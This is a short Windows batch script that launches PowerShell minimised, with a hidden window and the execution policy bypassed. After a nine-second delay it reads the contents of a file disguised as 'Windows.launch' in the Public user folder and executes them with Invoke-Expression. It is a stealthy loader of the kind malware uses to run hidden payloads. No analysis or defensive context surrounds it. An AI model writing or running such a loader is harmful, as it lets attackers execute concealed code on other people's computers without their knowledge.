@echo off
START /MIN PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
$launchFile = 'C:\Users\Public\Windows.launch'; ^
if (Test-Path $launchFile) { ^
    Start-Sleep -Seconds 9; ^
    $scriptContent = Get-Content -Path $launchFile -Raw; ^
    Invoke-Expression $scriptContent; ^
}
